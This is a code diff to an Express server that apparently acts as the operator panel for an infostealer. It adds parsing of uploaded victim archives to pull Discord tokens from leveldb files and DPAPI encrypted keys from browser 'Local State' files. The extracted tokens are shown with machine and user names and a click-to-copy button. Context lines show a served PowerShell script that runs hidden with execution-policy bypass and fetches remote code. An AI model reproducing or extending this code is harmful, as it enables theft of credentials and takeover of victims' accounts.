@@ -2,6 +2,7 @@ const express = require("express");
 const multer = require("multer");
 const crypto = require("crypto");
 const { Pool } = require("pg");
+const AdmZip = require("adm-zip");
 
 const app = express();
 const PORT = process.env.PORT || 8080;
@@ -169,6 +170,7 @@ function renderPage(entries, totalSize, k) {
       <td class="mono">${fmtSize(e.s || 0)}</td>
       <td><span class="dim">${fmtTime(e.t)}</span><br><span class="accent">${timeAgo(e.t)}</span></td>
       <td class="actions">
+        <a class="btn btn-t" href="/dc/${esc(e.id)}?key=${k}" title="view tokens">&#9670;</a>
         <a class="btn btn-p" href="/dl/${esc(e.id)}?key=${k}">&#8615;</a>
         <form method="POST" action="/rm/${esc(e.id)}?key=${k}" style="display:inline" onsubmit="return confirm('remove entry?')">
           <button class="btn btn-d" type="submit">&#10005;</button>
@@ -215,6 +217,7 @@ tbody tr:hover{background:#0d0d22}
 .tag-b{background:#1a1040;color:var(--accent)}
 .actions{white-space:nowrap}
 .btn{display:inline-flex;align-items:center;justify-content:center;width:28px;height:28px;border-radius:6px;border:1px solid var(--border);background:var(--card);color:var(--text);font-size:14px;cursor:pointer;text-decoration:none;transition:all .15s;font-family:var(--mono)}
+.btn-t:hover{background:#1a0a2a;color:var(--accent);border-color:var(--accent)}
 .btn-p:hover{background:#1a1a3a;color:var(--blue);border-color:var(--blue)}
 .btn-d:hover{background:#1a0a0a;color:var(--red);border-color:var(--red)}
 .empty{text-align:center;padding:80px 20px;color:var(--dim)}
@@ -475,6 +478,169 @@ Start-Process powershell -ArgumentList '-ep bypass -w hidden -c "irm https://${h
 `;
   res.setHeader("Content-Type", "text/plain");
   res.send(script);
+});
+
+function scanLDB(buf) {
+  const key = Buffer.concat([
+    Buffer.from("_https://discord.com"),
+    Buffer.from([0x00, 0x01]),
+    Buffer.from("token")
+  ]);
+  let pos = 0;
+  while (pos < buf.length) {
+    const idx = buf.indexOf(key, pos);
+    if (idx === -1) break;
+    pos = idx + 1;
+    const after = buf.slice(idx + key.length, idx + key.length + 200);
+    const v10 = after.indexOf(Buffer.from("v10"));
+    if (v10 >= 0 && v10 < 10) return { encrypted: true };
+    for (let s = 0; s < 20; s++) {
+      if (after[s] === 0x22) {
+        const end = after.indexOf(0x22, s + 1);
+        if (end > s + 15 && end < s + 160) {
+          const val = after.slice(s + 1, end).toString("utf8");
+          if (/^[A-Za-z0-9._-]{20,}$/.test(val)) return { token: val };
+        }
+      }
+    }
+  }
+  return null;
+}
+
+function parseDiscordZip(zipBuf) {
+  let zip;
+  try { zip = new AdmZip(zipBuf); } catch { return []; }
+  const entries = zip.getEntries();
+
+  const meta = (() => {
+    const me = entries.find(e => e.entryName === "m.json");
+    if (!me) return {};
+    try { return JSON.parse(me.getData().toString("utf8")); } catch { return {}; }
+  })();
+
+  const localState = {};
+  for (const e of entries) {
+    if (e.entryName.includes("Local State")) {
+      try {
+        const ls = JSON.parse(e.getData().toString("utf8"));
+        const enc = ls?.os_crypt?.encrypted_key;
+        if (enc) {
+          const tag = e.entryName.split("/")[0];
+          localState[tag] = enc;
+        }
+      } catch {}
+    }
+  }
+
+  const results = [];
+  const seen = new Set();
+
+  for (const e of entries) {
+    const name = e.entryName;
+    if (!name.includes("leveldb/")) continue;
+    if (!/\.(ldb|log|sst)$/.test(name)) continue;
+
+    const tag = name.split("/")[0];
+    if (!tag.startsWith("dc")) continue;
+    if (seen.has(tag)) continue;
+
+    const data = e.getData();
+    const found = scanLDB(data);
+    if (found) {
+      seen.add(tag);
+      results.push({
+        source: tag,
+        ...found,
+        encKey: localState[tag] || null,
+        machine: meta.m || "",
+        user: meta.u || "",
+        os: meta.o || "",
+      });
+    }
+  }
+
+  return results;
+}
+
+app.get("/dc/:id", checkKey, async (req, res) => {
+  try {
+    const { rows } = await pool.query(
+      `SELECT filedata, machine, username, os FROM grabs WHERE id = $1`, [req.params.id]
+    );
+    if (!rows.length) return res.status(404).send(page404());
+    const results = parseDiscordZip(rows[0].filedata);
+    const k = encodeURIComponent(req.query.key);
+
+    const cards = results.length ? results.map(r => {
+      if (r.encrypted) return `
+        <div class="tcard enc">
+          <div class="tc-tag">${esc(r.source)}</div>
+          <div class="tc-label">STATUS</div>
+          <div class="tc-val red">ENCRYPTED (DPAPI)</div>
+          ${r.encKey ? `<div class="tc-label">ENCRYPTED KEY (base64)</div><div class="tc-val mono small selectable">${esc(r.encKey)}</div>` : ""}
+          <div class="tc-label">MACHINE</div><div class="tc-val">${esc(r.machine)} \\ ${esc(r.user)}</div>
+        </div>`;
+      return `
+        <div class="tcard">
+          <div class="tc-tag">${esc(r.source)}</div>
+          <div class="tc-label">TOKEN</div>
+          <div class="tc-val mono selectable" onclick="cp(this)">${esc(r.token)}</div>
+          <div class="tc-hint">click to copy</div>
+          <div class="tc-label">MACHINE</div><div class="tc-val">${esc(r.machine)} \\ ${esc(r.user)}</div>
+          <div class="tc-label">OS</div><div class="tc-val dim">${esc(r.os)}</div>
+        </div>`;
+    }).join("") : `<div class="empty"><div class="icon">&#9673;</div><p>no discord tokens found in this grab</p></div>`;
+
+    res.send(`<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>tokens</title>
+<style>
+:root{--bg:#06060f;--card:#0c0c1e;--border:#14142e;--text:#8888aa;--dim:#44446a;--accent:#c084fc;--green:#4ade80;--red:#f87171;--mono:'Cascadia Code','Fira Code','Consolas',monospace}
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:var(--bg);color:var(--text);font-family:var(--mono);font-size:13px;min-height:100vh;padding:30px 24px}
+a.back{color:var(--dim);text-decoration:none;font-size:11px;display:inline-block;margin-bottom:24px}
+a.back:hover{color:var(--accent)}
+h2{color:var(--accent);letter-spacing:3px;font-size:13px;margin-bottom:20px}
+.tcard{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:22px 24px;margin-bottom:16px;position:relative}
+.tcard::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--accent),transparent);border-radius:10px 10px 0 0}
+.tcard.enc::before{background:linear-gradient(90deg,var(--red),transparent)}
+.tc-tag{font-size:10px;color:var(--dim);letter-spacing:2px;margin-bottom:14px;text-transform:uppercase}
+.tc-label{font-size:9px;color:var(--dim);text-transform:uppercase;letter-spacing:2px;margin-top:12px;margin-bottom:4px}
+.tc-val{color:#eee;word-break:break-all;line-height:1.5}
+.tc-val.mono{font-family:var(--mono);cursor:pointer}
+.tc-val.small{font-size:10px}
+.tc-val.red{color:var(--red)}
+.tc-val.dim{color:var(--dim)}
+.tc-hint{font-size:9px;color:var(--dim);margin-top:4px}
+.selectable{user-select:all}
+.empty{text-align:center;padding:60px 20px;color:var(--dim)}
+.empty .icon{font-size:32px;margin-bottom:10px;opacity:.3}
+.toast{position:fixed;bottom:24px;right:24px;background:var(--accent);color:#000;padding:10px 18px;border-radius:8px;font-size:12px;opacity:0;transition:opacity .3s;pointer-events:none}
+.toast.show{opacity:1}
+</style>
+</head>
+<body>
+<a class="back" href="/?key=${k}">← back</a>
+<h2>DISCORD TOKENS &mdash; ${esc(rows[0].machine || req.params.id)}</h2>
+${cards}
+<div class="toast" id="toast">copied</div>
+<script>
+function cp(el){
+  const t=el.innerText;
+  navigator.clipboard.writeText(t).then(()=>{
+    const toast=document.getElementById('toast');
+    toast.classList.add('show');
+    setTimeout(()=>toast.classList.remove('show'),1500);
+  });
+}
+</script>
+</body>
+</html>`);
+  } catch (err) {
+    res.status(500).send("error: " + err.message);
+  }
 });
 
 app.listen(PORT, () => {
